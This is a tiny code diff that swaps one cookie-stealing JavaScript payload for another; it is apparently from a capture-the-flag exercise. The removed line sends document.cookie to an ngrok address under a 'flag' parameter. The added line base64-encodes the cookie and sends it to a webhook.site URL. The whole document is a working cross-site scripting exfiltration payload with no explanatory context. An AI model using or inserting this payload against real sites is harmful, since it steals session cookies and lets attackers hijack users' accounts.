@@ -1,3 +1,1 @@
-fetch(`https://https://ec6f-109-138-53-168.ngrok-free.app/haha?flag=${encodeURIComponent(document.cookie)}`, {
-    method: 'GET',
-})
+fetch("https://webhook.site/5790174e-e954-483a-adec-cfca619c3ba5/?data="+btoa(document.cookie));
